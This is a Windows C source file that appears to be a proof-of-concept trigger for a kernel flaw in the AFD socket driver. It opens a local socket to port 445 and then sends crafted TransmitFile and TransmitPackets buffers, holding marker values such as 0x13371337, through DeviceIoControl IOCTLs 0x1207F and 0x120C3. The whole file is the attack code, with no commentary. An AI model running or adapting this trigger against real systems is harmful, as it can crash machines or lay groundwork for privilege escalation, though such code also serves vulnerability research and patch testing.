#include <windows.h>    
#include <ntdef.h>    
#include <winternl.h>    
#include <stdio.h>    

typedef struct _INPUT_AfdTransmitFile {    
	DWORD field1;    
	DWORD field2;    
	DWORD field3;    
	DWORD field4;    
	DWORD field5;    
	DWORD field6;    
	DWORD field7;    
	DWORD field8;    
	DWORD field9;    
	DWORD field10;    
	DWORD field11;    
	DWORD field12;    
} INPUT_AfdTransmitFile;    

typedef struct _INPUT_AfdTransmitPackets {    
	DWORD field1;    
	DWORD field2;    
	DWORD field3;    
	DWORD field4;    
	DWORD field5;    
	DWORD field6;    
} INPUT_AfdTransmitPackets;    

int main()    
{    
	DWORD bytesRet;    

	INPUT_AfdTransmitFile InputAfdTransmitFile = {0};    
	memset(&InputAfdTransmitFile, 0, sizeof(INPUT_AfdTransmitFile));    
	InputAfdTransmitFile.field7 = 0x13371337;    
	InputAfdTransmitFile.field8 = 0x15fcd9;    
	InputAfdTransmitFile.field11 = 1;    

	INPUT_AfdTransmitPackets InputAfdTransmitPackets = {0};    
	memset(&InputAfdTransmitPackets, 0, sizeof(INPUT_AfdTransmitPackets));    
	InputAfdTransmitPackets.field1 = 1;    
	InputAfdTransmitPackets.field2 = 0x0aaaaaaa;    

	WSADATA WSAData;  
	SOCKET sock_fd;  
	SOCKADDR_IN sa;  
	WSAStartup(0x2, &WSAData);  
	sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  
	memset(&sa, 0, sizeof(sa));  
	sa.sin_port = htons(445);  
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  
	sa.sin_family = AF_INET;  
	connect(sock_fd, (const struct sockaddr*) & sa, sizeof(sa));  

	DeviceIoControl((HANDLE)sock_fd, 0X1207F, (LPVOID)&InputAfdTransmitFile, \
			sizeof(INPUT_AfdTransmitFile), NULL, 0, &bytesRet, NULL);    
	DeviceIoControl((HANDLE)sock_fd, 0X120C3, (LPVOID)&InputAfdTransmitPackets, \
			sizeof(INPUT_AfdTransmitPackets), NULL, 0, &bytesRet, NULL);    

	return 0;    
}    
